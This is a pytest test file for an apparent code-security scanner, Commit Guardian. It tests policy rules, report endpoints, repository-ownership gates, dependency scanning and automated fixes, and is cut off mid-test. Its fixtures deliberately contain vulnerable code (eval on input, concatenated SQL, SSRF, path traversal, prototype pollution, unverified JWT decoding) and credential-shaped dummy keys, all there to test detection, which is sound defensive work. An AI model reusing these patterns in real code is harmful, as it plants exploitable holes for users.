"""
Regression tests for Commit Guardian startup upgrades:
- .aegis.yml policy enforcement in SASTScanner (custom_rules, ignore_paths, severity_threshold)
- 1-click demo audit endpoint (/api/scan/demo) + compliance PDF/MD report serving (/api/v1/reports/...)
- Path traversal protection & local_path production guard
- Offline rule-based remediation fallback
- Telegram PDF compliance delivery & GitHub PR audit comment posting
"""

import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from aegis.ai.remediation_engine import RemediationEngine
from aegis.core.config import settings
from aegis.core.metrics_store import get_metrics_store
from aegis.scanners.models import SASTScanResult, ScannerType, Severity, VulnerabilityFinding
from aegis.scanners.sast_scanner import SASTScanner


@pytest.mark.asyncio
async def test_sast_applies_aegis_yml_custom_rules_and_ignores(tmp_path: Path):
    (tmp_path / ".aegis.yml").write_text(
        """
ignore_paths:
  - "ignored_dir/**"
ignore_rules:
  - dynamic-code-eval
severity_threshold: HIGH
ai_filter: false
custom_rules:
  - id: unmasked-kz-iin-log
    pattern: "logger\\\\.info\\\\([^)]*\\\\biin\\\\b"
    title: "Unmasked IIN logged"
    severity: HIGH
    cwe: ["CWE-532"]
""",
        encoding="utf-8",
    )
    (tmp_path / "service.py").write_text(
        "import logging\n"
        "logger = logging.getLogger('app')\n"
        "def f(iin, expr):\n"
        "    logger.info(f'iin={iin}')\n"
        "    return eval(expr)\n",
        encoding="utf-8",
    )
    ignored = tmp_path / "ignored_dir"
    ignored.mkdir()
    (ignored / "skip.py").write_text("logger.info(f'iin={iin}')\n", encoding="utf-8")

    result = await SASTScanner().scan(tmp_path)
    ids = {f.id for f in result.findings}
    files = {f.file_path for f in result.findings}

    assert "unmasked-kz-iin-log" in ids
    assert "dynamic-code-eval" not in ids  # ignored by ignore_rules
    assert all(not fp.startswith("ignored_dir/") for fp in files)


@pytest.mark.asyncio
async def test_demo_scan_endpoint_generates_reports_and_dashboard_links(tmp_path: Path, monkeypatch):
    from aegis_server.main import app

    monkeypatch.setattr(settings, "scan_output_dir", tmp_path / "reports")
    monkeypatch.setattr(settings, "metrics_db_path", tmp_path / "metrics.db")
    monkeypatch.setattr(settings, "report_pdf_enabled", True)

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
        demo = await client.post("/api/scan/demo")
        assert demo.status_code == 200
        payload = demo.json()
        assert payload["status"] == "success"
        assert payload["total_findings"] >= 4
        assert payload["security_score"] < 50
        assert payload["grade"] in {"D", "F"}
        assert payload["report_pdf_url"].startswith("/api/v1/reports/")
        assert payload["report_md_url"].startswith("/api/v1/reports/")

        pdf_resp = await client.get(payload["report_pdf_url"])
        md_resp = await client.get(payload["report_md_url"])
        dash_resp = await client.get("/dashboard")
        bad_report = await client.get("/api/v1/reports/demo__kz-fintech-app/secret.txt")

    assert pdf_resp.status_code == 200 and pdf_resp.content[:5] == b"%PDF-"
    assert md_resp.status_code == 200 and "Commit Guardian" in md_resp.text
    assert bad_report.status_code == 400
    assert dash_resp.status_code == 200
    assert payload["report_pdf_url"] in dash_resp.text
    assert "https://" not in dash_resp.text and "http://" not in dash_resp.text
    assert get_metrics_store().summary().total_scans == 1


@pytest.mark.asyncio
async def test_local_path_blocked_in_production(monkeypatch):
    from web.api import app

    monkeypatch.setattr(settings, "environment", "production")
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.post("/api/v1/scan/sast", json={"local_path": "/etc"})
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_remediation_fallback_when_ollama_offline():
    finding = VulnerabilityFinding(
        id="sql-injection-dynamic-query",
        scanner=ScannerType.CUSTOM,
        title="Dynamic SQL Injection",
        description="Unsafe SQL concat",
        severity=Severity.CRITICAL,
        file_path="payment_gateway.py",
        line_start=18,
        cwe=["CWE-89"],
    )
    engine = RemediationEngine()
    with patch.object(engine, "_query_ollama", AsyncMock(side_effect=ConnectionError("Ollama down"))):
        res = await engine.analyze_and_remediate(finding, code_context="cursor.execute('SELECT * ' + uid)")

    assert res.confidence_score > 0.5
    assert "параметризованный" in res.remediation_steps[0].lower()
    assert "?" in res.fixed_code


@pytest.mark.asyncio
async def test_bot_delivers_score_and_pdf_report(tmp_path: Path, monkeypatch):
    from bot.main import _deliver_scan_result

    monkeypatch.setattr(settings, "scan_output_dir", tmp_path / "reports")
    monkeypatch.setattr(settings, "metrics_db_path", tmp_path / "metrics.db")
    monkeypatch.setattr(settings, "report_pdf_enabled", True)

    result = SASTScanResult(
        target_path=str(tmp_path),
        total_findings=1,
        findings_by_severity={Severity.CRITICAL: 1},
        findings=[
            VulnerabilityFinding(
                id="sqli-1",
                scanner=ScannerType.CUSTOM,
                title="SQL Injection",
                description="Dynamic SQL",
                severity=Severity.CRITICAL,
                file_path="app.py",
                line_start=10,
                cwe=["CWE-89"],
            )
        ],
        duration_seconds=0.4,
    )

    msg = MagicMock()
    msg.from_user = MagicMock(username="madiyar", id=42)
    msg.reply_document = AsyncMock()
    status_msg = MagicMock()
    status_msg.edit_text = AsyncMock()

    await _deliver_scan_result(msg, status_msg, result, "owner/repo", "deadbeef1234")

    edited = status_msg.edit_text.await_args.args[0]
    assert "Security Score" in edited
    assert "75/100" in edited
    msg.reply_document.assert_awaited_once()


@pytest.mark.asyncio
async def test_webhook_posts_github_pr_comment_when_token_set(monkeypatch):
    from web.webhook import post_github_pr_comment

    monkeypatch.setattr(settings, "github_token", "real_looking_pat_token")
    posted = {}

    class DummyResp:
        status_code = 201

    class DummyClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def post(self, url, headers=None, json=None):
            posted["url"] = url
            posted["body"] = json["body"]
            return DummyResp()

    res = SASTScanResult(
        target_path="/tmp/x",
        total_findings=1,
        findings_by_severity={Severity.HIGH: 1},
        findings=[
            VulnerabilityFinding(
                id="r-1",
                scanner=ScannerType.CUSTOM,
                title="Eval Call",
                description="Unsafe eval",
                severity=Severity.HIGH,
                file_path="app.py",
                line_start=5,
                cwe=["CWE-95"],
            )
        ],
    )

    with patch("web.webhook.httpx.AsyncClient", return_value=DummyClient()):
        ok = await post_github_pr_comment("gov/portal", 7, "abc12345", res, 90, "A+", "Риск умеренный.")

    assert ok is True
    assert posted["url"].endswith("/repos/gov/portal/issues/7/comments")
    assert "90/100 (A+)" in posted["body"]


def test_parse_chat_payload_supports_text_context_and_reset():
    from aegis_server.main import _parse_chat_payload

    assert _parse_chat_payload("  привет  ") == (False, "привет", "")
    assert _parse_chat_payload("{invalid-json") == (False, "{invalid-json", "")
    assert _parse_chat_payload('{"reset": true}') == (True, "", "")

    reset, text, note = _parse_chat_payload(
        '{"message": "Как починить SQLi?", "scan_context": {"repo_name": "demo/kz", "security_score": 40, "grade": "F", "total_findings": 1, "findings": [{"severity": "CRITICAL", "title": "SQL Injection", "file_path": "pay.py", "line_start": 18, "cwe": ["CWE-89"]}]}}'
    )
    assert reset is False
    assert text == "Как починить SQLi?"
    assert "demo/kz" in note and "40/100 (F)" in note and "SQL Injection (pay.py:18, CWE-89)" in note


def test_ownership_parser_and_signed_proof_tokens():
    from aegis.core.verifier import OwnershipVerifier

    assert OwnershipVerifier.parse_github_repo("https://github.com/vercel/next.js.git") == "vercel/next.js"
    assert OwnershipVerifier.parse_github_repo("https://github.com/owner/my.app/tree/main") == "owner/my.app"

    ch_repo = OwnershipVerifier.issue_challenge("https://github.com/kz-bank/core-api")
    assert ch_repo["target_type"] == "github"
    assert ch_repo["target"] == "kz-bank/core-api"
    assert ch_repo["challenge_code"].startswith("cybersec-verify-")

    ch_domain = OwnershipVerifier.issue_challenge("https://pay.kaspi-demo.kz/login", "domain")
    assert ch_domain["target_type"] == "domain"
    assert ch_domain["target"] == "pay.kaspi-demo.kz"

    proof = OwnershipVerifier.create_proof_token("kz-bank/core-api", "commit_challenge", "madiyar")
    assert OwnershipVerifier.verify_proof_token(proof, "https://github.com/kz-bank/core-api") is not None
    assert OwnershipVerifier.verify_proof_token(proof, "https://github.com/other/repo") is None


@pytest.mark.asyncio
async def test_ownership_verification_endpoints_and_strict_gate():
    from aegis.core.verifier import OwnershipVerifier
    from aegis_server.main import app

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
        ch_resp = await client.post("/api/v1/verify/challenge", json={"target": "owner/app.py"})
        assert ch_resp.status_code == 200
        code = ch_resp.json()["challenge_code"]

        with patch.object(
            OwnershipVerifier,
            "verify_commit_challenge",
            AsyncMock(return_value=(True, f"Код подтверждения найден: {code}")),
        ):
            verify_resp = await client.post(
                "/api/v1/verify/ownership",
                json={"target": "owner/app.py", "method": "challenge", "challenge_code": code},
            )
        assert verify_resp.status_code == 200
        vdata = verify_resp.json()
        assert vdata["verified"] is True and vdata["proof_token"]

        blocked_sast = await client.post(
            "/api/v1/scan/sast",
            json={"repo_url": "https://github.com/owner/app.py", "require_ownership": True},
        )
        assert blocked_sast.status_code == 403

        blocked_dast = await client.post(
            "/api/v1/scan/dast",
            json={"target_url": "https://example.kz", "require_ownership": True},
        )
        assert blocked_dast.status_code == 403


@pytest.mark.asyncio
async def test_sca_scanner_strips_extras_comments_and_tracks_lines(tmp_path: Path):
    from aegis.scanners.sca_scanner import SCAScanner

    req = tmp_path / "requirements.txt"
    req.write_text("# comment\nuvicorn[standard]>=0.30.0  # web server\nfastapi==0.111.0; python_version>='3.9'\n")

    captured_batches = []

    class DummyResp:
        status_code = 200

        @staticmethod
        def json():
            return {"results": [{}, {}]}

    class DummyClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def post(self, url, json=None):
            captured_batches.extend(json["queries"])
            return DummyResp()

    with patch("aegis.scanners.sca_scanner.httpx.AsyncClient", return_value=DummyClient()):
        findings = await SCAScanner().scan(tmp_path)

    assert findings == []
    assert [q["package"]["name"] for q in captured_batches] == ["uvicorn", "fastapi"]
    assert [q["version"] for q in captured_batches] == ["0.30.0", "0.111.0"]


def test_offline_appsec_chat_covers_findings_patches_policy_and_authorship():
    from aegis.ai.offline_chat import build_offline_appsec_reply

    scan_ctx = {
        "repo_name": "demo/kz-fintech-app",
        "security_score": 0,
        "grade": "F",
        "total_findings": 2,
        "findings": [
            {
                "severity": "CRITICAL",
                "title": "SQL Injection in query",
                "file_path": "db.py",
                "line_start": 42,
                "cwe": ["CWE-89"],
            },
            {
                "severity": "HIGH",
                "title": "subprocess with shell=True",
                "file_path": "runner.py",
                "line_start": 11,
                "cwe": ["CWE-78"],
            },
        ],
    }

    crit_reply = build_offline_appsec_reply("Объясни критичные баги", scan_ctx, "qwen2.5-coder:14b")
    assert "demo/kz-fintech-app" in crit_reply and "db.py:42" in crit_reply and "CWE-89" in crit_reply

    sql_reply = build_offline_appsec_reply("Патч от SQL-инъекции", scan_ctx, "qwen2.5-coder:14b")
    assert "db.py:42" in sql_reply and "cursor.execute" in sql_reply

    policy_reply = build_offline_appsec_reply("Политика .aegis.yml и ИИН", scan_ctx, "qwen2.5-coder:14b")
    assert "kz-iin-in-logs" in policy_reply and "severity_threshold" in policy_reply

    auth_reply = build_offline_appsec_reply("Как работает проверка авторства?", scan_ctx, "qwen2.5-coder:14b")
    assert "proof_token" in auth_reply and "DNS TXT" in auth_reply


@pytest.mark.asyncio
async def test_http_chat_fallback_and_dashboard_honest_ai_posture(monkeypatch):
    from aegis_server.main import app

    monkeypatch.setattr(settings, "ollama_base_url", "http://127.0.0.1:9")
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
        chat_resp = await client.post(
            "/api/chat",
            json={
                "message": "Как работает проверка авторства?",
                "scan_context": {"repo_name": "demo/kz", "security_score": 40, "grade": "F", "total_findings": 0},
            },
        )
        assert chat_resp.status_code == 200
        assert "proof_token" in chat_resp.json()["reply"]

        scan_resp = await client.post("/api/chat", json={"message": "https://github.com/vercel/next.js"})
        assert scan_resp.status_code == 200 and scan_resp.json()["action"] == "SCAN"

        metrics_resp = await client.get("/api/v1/dashboard/metrics")
        assert metrics_resp.status_code == 200
        mdata = metrics_resp.json()
        assert mdata["llm_mode"].startswith("Ollama")
        assert mdata["llm_online"] is False
        assert "standby" in mdata["llm_mode"]


def test_configured_ollama_model_presence_check():
    from aegis.ai.offline_chat import is_configured_model_available

    assert is_configured_model_available({"models": [{"name": "qwen:latest"}]}, "qwen2.5-coder:14b") is False
    assert is_configured_model_available({"models": [{"name": "qwen2.5-coder:14b"}]}, "qwen2.5-coder:14b") is True
    assert is_configured_model_available({"models": []}, "qwen2.5-coder:14b") is False


def test_sparse_path_selector_skips_assets_and_prioritizes_security_files():
    from aegis.core.git_clone import select_security_sparse_paths

    paths = [
        "public/assets/fonts/icon.svg",
        "public/emoji/1f600.png",
        "docs/readme.md",
        "scripts/vite.preview.config.ts",
        "scripts/server.js",
        "vite.config.ts",
        "src/vendor/bundle.min.js",
        "src/components/ui/button.tsx",
        "src/auth/jwt_middleware.ts",
        "src/lib/mtproto/crypto.ts",
        "package.json",
        ".env.example",
        "tests/e2e/smoke.spec.ts",
        "tests/unit/smoke.test.ts",
    ]
    selected = select_security_sparse_paths(paths, max_files=10)
    assert "public/assets/fonts/icon.svg" not in selected
    assert "public/emoji/1f600.png" not in selected
    assert "scripts/vite.preview.config.ts" not in selected
    assert "scripts/server.js" not in selected
    assert "vite.config.ts" not in selected
    assert "tests/e2e/smoke.spec.ts" not in selected
    assert "src/vendor/bundle.min.js" not in selected
    assert ".env.example" in selected[:2]
    assert "package.json" in selected[:2]
    assert selected.index("src/auth/jwt_middleware.ts") < selected.index("src/components/ui/button.tsx")
    assert selected.index("src/lib/mtproto/crypto.ts") < selected.index("src/components/ui/button.tsx")
    assert selected.index("src/components/ui/button.tsx") < selected.index("tests/unit/smoke.test.ts")


def test_sanitizer_filters_dev_tooling_backend_noise_but_keeps_real_client_bugs_and_secrets():
    from aegis.scanners.sanitizer import FalsePositiveSanitizer

    san = FalsePositiveSanitizer()

    # Dev/build scripts should NOT emit backend CSRF / path-traversal noise
    dev_path_trav = VulnerabilityFinding(
        id="javascript.lang.security.audit.path-traversal.path-join-resolve-traversal",
        scanner=ScannerType.SEMGREP,
        title="Semgrep: path-join-resolve-traversal",
        description="path.join in vite preview script",
        severity=Severity.MEDIUM,
        file_path="scripts/vite.preview.config.ts",
        line_start=254,
    )
    dev_csrf = VulnerabilityFinding(
        id="javascript.express.security.audit.express-check-csurf-middleware-usage",
        scanner=ScannerType.SEMGREP,
        title="Semgrep: express-check-csurf-middleware-usage",
        description="Local dev server missing csurf",
        severity=Severity.LOW,
        file_path="scripts/server.js",
        line_start=7,
    )
    docs_child_proc = VulnerabilityFinding(
        id="javascript.lang.security.detect-child-process.detect-child-process",
        scanner=ScannerType.SEMGREP,
        title="Semgrep: detect-child-process",
        description="Archived doc helper script",
        severity=Severity.HIGH,
        file_path="docs/upstream/git-serve.js",
        line_start=43,
    )
    script_taint = VulnerabilityFinding(
        id="taint-flow-1",
        scanner=ScannerType.CUSTOM,
        title="Path Traversal: <module>() -> cut()",
        description="CLI eval helper reading argv path",
        severity=Severity.HIGH,
        file_path="scripts/noise-suppression-eval/stream.py",
        line_start=82,
    )
    js_fmt = VulnerabilityFinding(
        id="javascript.lang.security.audit.unsafe-formatstring",
        scanner=ScannerType.SEMGREP,
        title="Semgrep: unsafe-formatstring",
        description="console.log dynamic string",
        severity=Severity.LOW,
        file_path="src/components/call/callDeviceSettings.tsx",
        line_start=63,
    )
    # Real client runtime bugs (ReDoS & WebView postMessage in src/) MUST stay
    client_redos = VulnerabilityFinding(
        id="javascript.lang.security.audit.detect-non-literal-regexp",
        scanner=ScannerType.SEMGREP,
        title="Semgrep: detect-non-literal-regexp",
        description="Dynamic RegExp in client parser",
        severity=Severity.MEDIUM,
        file_path="src/lib/linkCleaner/adGuardRule.ts",
        line_start=132,
    )
    client_postmsg = VulnerabilityFinding(
        id="javascript.browser.security.insufficient-postmessage-origin-validation",
        scanner=ScannerType.SEMGREP,
        title="Semgrep: insufficient-postmessage-origin-validation",
        description="Missing origin validation in WebView postMessage handler",
        severity=Severity.MEDIUM,
        file_path="src/components/telegramWebView.ts",
        line_start=11,
    )
    # Real secret leaked inside scripts/ MUST STILL stay
    dev_secret = VulnerabilityFinding(
        id="secret-abc12345",
        scanner=ScannerType.SECRET,
        title="Hardcoded AWS Access Key",
        description="Real leaked key in deploy script",
        severity=Severity.CRITICAL,
        file_path="scripts/deploy.sh",
        line_start=4,
        code_snippet='AWS_KEY="AKIA9X7K2M4P8Q1R6T3V"',
    )

    assert san.sanitize_finding(dev_path_trav) is None
    assert san.sanitize_finding(dev_csrf) is None
    assert san.sanitize_finding(docs_child_proc) is None
    assert san.sanitize_finding(script_taint) is None
    assert san.sanitize_finding(js_fmt) is None
    assert san.sanitize_finding(client_redos) is not None
    assert san.sanitize_finding(client_postmsg) is not None
    assert san.sanitize_finding(dev_secret) is not None


@pytest.mark.asyncio
async def test_sca_npm_separates_prod_dependencies_from_dev_dependencies(tmp_path: Path):
    from aegis.scanners.sca_scanner import SCAScanner

    pkg = tmp_path / "package.json"
    pkg.write_text(
        '{\n'
        '  "name": "web-client",\n'
        '  "dependencies": {\n'
        '    "dompurify": "^3.0.0"\n'
        '  },\n'
        '  "devDependencies": {\n'
        '    "vitest": "^1.6.0"\n'
        '  }\n'
        '}\n',
        encoding="utf-8",
    )

    class DummyResp:
        status_code = 200

        @staticmethod
        def json():
            return {
                "results": [
                    {"vulns": [{"id": "GHSA-dev-1", "summary": "Vulnerability in vitest"}]},
                    {"vulns": [{"id": "GHSA-prod-1", "summary": "XSS in dompurify", "aliases": ["CVE-2025-9999"]}]},
                ]
            }

    class DummyClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def post(self, url, json=None):
            return DummyResp()

    with patch("aegis.scanners.sca_scanner.httpx.AsyncClient", return_value=DummyClient()):
        findings = await SCAScanner().scan(tmp_path)

    by_id = {f.id: f for f in findings}
    assert by_id["sca-ghsa-dev-1"].severity == Severity.INFO
    assert by_id["sca-ghsa-dev-1"].title.startswith("[devDependency]")
    assert by_id["sca-ghsa-dev-1"].line_start == 7
    assert by_id["sca-ghsa-prod-1"].severity == Severity.HIGH
    assert not by_id["sca-ghsa-prod-1"].title.startswith("[devDependency]")
    assert by_id["sca-ghsa-prod-1"].line_start == 4


@pytest.mark.asyncio
async def test_clone_repo_resilient_switches_to_sparse_for_large_repos_and_timeouts(tmp_path: Path):
    import asyncio
    from aegis.core import git_clone

    status_events = []

    async def on_status(msg: str) -> None:
        status_events.append(msg)

    # Case 1: Large repo (>15 MB) skips full clone and runs sparse directly
    with (
        patch.object(git_clone, "fetch_github_repo_size_kb", AsyncMock(return_value=58_000)),
        patch.object(
            git_clone,
            "_try_sparse_code_clone",
            AsyncMock(return_value=git_clone.CloneOutcome(success=True, mode="sparse", files_checked_out=250)),
        ) as sparse_mock,
    ):
        res = await git_clone.clone_repo_resilient("vxrn0/exterayond", tmp_path / "repo1", on_status=on_status)

    assert res.success is True
    assert res.mode == "sparse"
    assert res.files_checked_out == 250
    sparse_mock.assert_awaited_once()
    assert any("sparse" in s.lower() for s in status_events)

    # Case 2: Tier 1 timeout falls back cleanly to Tier 2 sparse without empty error
    with (
        patch.object(git_clone, "fetch_github_repo_size_kb", AsyncMock(return_value=2_000)),
        patch.object(git_clone, "_run_git", AsyncMock(side_effect=asyncio.TimeoutError())),
        patch.object(
            git_clone,
            "_try_sparse_code_clone",
            AsyncMock(return_value=git_clone.CloneOutcome(success=True, mode="sparse", files_checked_out=42)),
        ) as sparse_fallback,
    ):
        res2 = await git_clone.clone_repo_resilient("owner/slow-repo", tmp_path / "repo2")

    assert res2.success is True
    assert res2.mode == "sparse"
    sparse_fallback.assert_awaited_once()


@pytest.mark.asyncio
async def test_mandatory_ownership_blocks_third_party_repos_even_on_bypass_attempt(monkeypatch):
    from aegis.core.verifier import OwnershipVerifier
    from aegis_server.main import app

    monkeypatch.setattr(settings, "environment", "production")
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
        # 1. Default request without proof_token or github_token MUST be blocked with 403 + 1-click verify URL
        r1 = await client.post("/api/scan/repo", json={"github_url": "https://github.com/vxrn0/exterayond"})
        assert r1.status_code == 403
        d1 = r1.json()
        assert d1["code"] == "OWNERSHIP_REQUIRED"
        assert d1["challenge_code"].startswith("cybersec-verify-")
        assert d1["verify_url"].startswith("https://github.com/vxrn0/exterayond/new/")
        assert d1["challenge_code"] in d1["verify_url"]

        # 2. Client attempting require_ownership=False bypass in production MUST STILL be blocked
        r2 = await client.post(
            "/api/scan/repo",
            json={"github_url": "https://github.com/vxrn0/exterayond", "require_ownership": False},
        )
        assert r2.status_code == 403
        assert r2.json()["code"] == "OWNERSHIP_REQUIRED"

        # 3. /verify in chat mints signed proof_token bound strictly to that repo
        with patch.object(
            OwnershipVerifier,
            "verify_commit_challenge",
            AsyncMock(return_value=(True, "Код подтверждения найден в коммите.")),
        ):
            v_resp = await client.post(
                "/api/chat",
                json={"message": "/verify madiyar/my-app cybersec-verify-12345678"},
            )
        assert v_resp.status_code == 200
        va = v_resp.json()["verified_authorship"]
        assert va["target"] == "madiyar/my-app"
        assert va["proof_token"]

        # Proof token for madiyar/my-app MUST NOT unlock vxrn0/exterayond
        r3 = await client.post(
            "/api/scan/repo",
            json={"github_url": "https://github.com/vxrn0/exterayond", "proof_token": va["proof_token"]},
        )
        assert r3.status_code == 403


@pytest.mark.asyncio
async def test_zero_terminal_verify_contents_api_and_repo_description():
    import base64
    from aegis.core import verifier as verifier_mod
    from aegis.core.verifier import OwnershipVerifier

    verifier_mod._GITHUB_ETAG_CACHE.clear()
    code = "cybersec-verify-deadbeef99"

    class MockResp:
        def __init__(self, status_code, payload=None, text="", headers=None):
            self.status_code = status_code
            self._payload = payload
            self.text = text
            self.headers = headers or {}

        def json(self):
            return self._payload

    # Case 1: Match via GitHub About / Description
    class DescClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def get(self, url, headers=None):
            if "/commits" in url:
                return MockResp(200, [{"sha": "abc1234", "commit": {"message": "init", "author": {"name": "dev"}}}])
            if url.endswith("/repos/alice/app"):
                return MockResp(200, {"default_branch": "main", "description": f"Demo app {code}"})
            return MockResp(404)

    with patch("aegis.core.verifier.httpx.AsyncClient", return_value=DescClient()):
        ok, msg = await OwnershipVerifier.verify_commit_challenge("alice/app", code)
    assert ok is True
    assert "описании репозитория" in msg

    # Case 2: Match via instant GitHub Contents API (base64 verify.txt)
    verifier_mod._GITHUB_ETAG_CACHE.clear()
    b64_content = base64.b64encode(f"{code}\n".encode("utf-8")).decode("ascii")

    class ContentsClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def get(self, url, headers=None):
            if "/commits" in url:
                return MockResp(200, [{"sha": "abc1234", "commit": {"message": "add file", "author": {"name": "dev"}}}])
            if url.endswith("/repos/bob/portal"):
                return MockResp(200, {"default_branch": "main", "description": ""})
            if url.endswith("/contents/verify.txt"):
                return MockResp(200, {"content": b64_content})
            return MockResp(404)

    with patch("aegis.core.verifier.httpx.AsyncClient", return_value=ContentsClient()):
        ok2, msg2 = await OwnershipVerifier.verify_commit_challenge("bob/portal", code)
    assert ok2 is True
    assert "verify.txt" in msg2

    # Case 3: Match via GitHub Web UI patch branch (when main has branch protection)
    verifier_mod._GITHUB_ETAG_CACHE.clear()

    class PatchBranchClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def get(self, url, headers=None):
            if "/commits" in url:
                return MockResp(200, [{"sha": "0000001", "commit": {"message": "init", "author": {"name": "dev"}}}])
            if url.endswith("/repos/madiyar/growthlab"):
                return MockResp(200, {"default_branch": "main", "description": ""})
            if "/branches" in url:
                return MockResp(
                    200,
                    [
                        {"name": "main", "commit": {"sha": "0000001"}},
                        {"name": "madiyar-patch-1", "commit": {"sha": "1111111"}},
                        {"name": "madiyar-patch-2", "commit": {"sha": "2222222"}},
                    ],
                )
            if url == "https://raw.githubusercontent.com/madiyar/growthlab/2222222/verify.txt":
                return MockResp(200, text=f"{code}\n")
            return MockResp(404)

    with patch("aegis.core.verifier.httpx.AsyncClient", return_value=PatchBranchClient()):
        ok3, msg3 = await OwnershipVerifier.verify_commit_challenge("madiyar/growthlab", code)
    assert ok3 is True
    assert "madiyar-patch-2" in msg3


@pytest.mark.asyncio
async def test_autofix_js_ts_and_atomic_github_commit(tmp_path: Path):
    from aegis.core.self_heal import (
        FileFix,
        HealingReport,
        SelfHealer,
        fix_js_innerhtml,
        fix_js_insecure_tls,
        fix_js_postmessage_origin,
    )
    from aegis.core.verifier import OwnershipVerifier
    from aegis.core.pr_creator import PullRequestCreator
    from aegis.core import git_clone
    from aegis_server.main import app

    # 1. JS/TS deterministic fixers
    assert "window.location.origin" in fix_js_postmessage_origin("window.parent.postMessage(data, '*');", [])
    assert "rejectUnauthorized: true" in fix_js_insecure_tls("const agent = new Agent({ rejectUnauthorized: false });", [])
    assert "el.textContent = userBio" in fix_js_innerhtml("el.innerHTML = userBio;", [])

    # 2. Chat intent triggers AUTOFIX
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
        chat_res = await client.post("/api/chat", json={"message": "исправь баги и закоммить в репо"})
        assert chat_res.status_code == 200
        assert chat_res.json()["action"] == "AUTOFIX"

        # 3. Unverified repo MUST be blocked on /api/repo/autofix
        blocked = await client.post(
            "/api/repo/autofix",
            json={"github_url": "https://github.com/other/repo"},
        )
        assert blocked.status_code == 403
        assert blocked.json()["code"] == "OWNERSHIP_REQUIRED"

        # 4. Verified repo with github_token runs SelfHealer + atomic multi-file commit
        proof = OwnershipVerifier.create_proof_token("madiyar/growthlab", "commit_challenge", "madiyar")
        fake_report = HealingReport(
            before_score=55,
            before_grade="D",
            after_score=95,
            after_grade="A+",
            before_findings=2,
            after_findings=0,
            fixes=[
                FileFix(
                    file_path="src/web.ts",
                    fixers=["Ограничен targetOrigin в postMessage()"],
                    diff="-postMessage(x, '*')\n+postMessage(x, window.location.origin)\n",
                    fixed_findings=["postMessage wildcard"],
                    verified=True,
                    patched_content="window.parent.postMessage(x, window.location.origin);\n",
                )
            ],
        )

        async def _fake_clone(repo_url, dest_dir, token=None, on_status=None):
            dest_dir.mkdir(parents=True, exist_ok=True)
            return git_clone.CloneOutcome(success=True, mode="full")

        fake_commit = {
            "success": True,
            "committed": True,
            "direct_commit": False,
            "branch_name": "aegis/autofix-20261122-170000",
            "base_branch": "main",
            "commit_sha": "abcdef1234567890",
            "commit_url": "https://github.com/madiyar/growthlab/commit/abcdef1234567890",
            "pull_request_url": "https://github.com/madiyar/growthlab/pull/5",
            "files_committed": ["src/web.ts"],
            "message": "Коммит запушен и открыт PR.",
        }

        with (
            patch("aegis_server.main.clone_repo_resilient", side_effect=_fake_clone),
            patch.object(SelfHealer, "heal", AsyncMock(return_value=fake_report)),
            patch.object(PullRequestCreator, "commit_multi_file_fixes", AsyncMock(return_value=fake_commit)) as mock_commit,
        ):
            # Case A: without github_token -> returns diffs + needs_token=True
            r_preview = await client.post(
                "/api/repo/autofix",
                json={"github_url": "madiyar/growthlab", "proof_token": proof},
            )
            assert r_preview.status_code == 200
            dp = r_preview.json()
            assert dp["committed"] is False
            assert dp["needs_token"] is True
            assert dp["fixed_count"] == 1
            assert dp["after_score"] == 95
            assert mock_commit.await_count == 0

            # Case B: with github_token -> calls atomic commit & returns PR + commit URL
            r_commit = await client.post(
                "/api/repo/autofix",
                json={
                    "github_url": "madiyar/growthlab",
                    "proof_token": proof,
                    "github_token": "ghp_testtoken1234567890",
                    "direct_commit": False,
                },
            )
            assert r_commit.status_code == 200
            dc = r_commit.json()
            assert dc["committed"] is True
            assert dc["commit_sha"] == "abcdef1234567890"
            assert dc["pull_request_url"].endswith("/pull/5")
            mock_commit.assert_awaited_once()





@pytest.mark.asyncio
async def test_nextjs_js_taint_and_monorepo_sca_offline_cves(tmp_path: Path):
    from aegis.scanners.nextjs_scanner import NextJSSecurityScanner
    from aegis.scanners.sca_scanner import SCAScanner

    # 1. Vulnerable Next.js Server Action + NEXT_PUBLIC secret + JS Taint (SQLi, SSRF, Path Traversal, Prototype Pollution, JWT decode)
    (tmp_path / ".env.local").write_text("NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_demo1234567890abcdef\n", encoding="utf-8")

    actions = tmp_path / "src" / "app" / "actions.ts"
    actions.parent.mkdir(parents=True, exist_ok=True)
    actions.write_text(
        "'use server';\n"
        "export async function deleteOrder(orderId: string) {\n"
        "  await prisma.order.delete({ where: { id: orderId } });\n"
        "}\n",
        encoding="utf-8",
    )

    api_route = tmp_path / "src" / "app" / "api" / "proxy" / "route.ts"
    api_route.parent.mkdir(parents=True, exist_ok=True)
    api_route.write_text(
        "import fs from 'fs';\n"
        "import jwt from 'jsonwebtoken';\n"
        "import _ from 'lodash';\n"
        "export async function POST(req: any) {\n"
        "  const { targetUrl, fileName, userId } = await req.json();\n"
        "  const user = jwt.decode(req.headers.get('authorization'));\n"
        "  _.merge({}, req.body);\n"
        "  const upstream = await fetch(targetUrl);\n"
        "  const safeLocal = await fetch(`/api/internal/${userId}`);\n"
        "  const rows = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = '${userId}'`);\n"
        "  const content = fs.readFileSync(`/tmp/uploads/${fileName}`);\n"
        "  return Response.json({ upstream, safeLocal, rows, content, user });\n"
        "}\n",
        encoding="utf-8",
    )

    # 2. Monorepo nested package.json + package-lock.json with known Next.js CVE-2025-29927 and transitive lodash
    fe_dir = tmp_path / "frontend"
